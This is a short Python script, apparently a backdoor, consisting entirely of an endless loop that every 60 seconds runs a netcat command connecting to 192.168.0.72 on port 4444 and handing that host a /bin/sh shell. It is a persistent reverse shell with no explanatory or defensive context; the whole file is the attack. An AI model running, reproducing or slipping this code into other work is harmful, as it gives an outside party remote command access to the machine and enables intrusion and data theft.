#! /usr/bin/env python
import os
import time

while True:
		os.system("nc 192.168.0.72 4444 -e /bin/sh")
		time.sleep(60)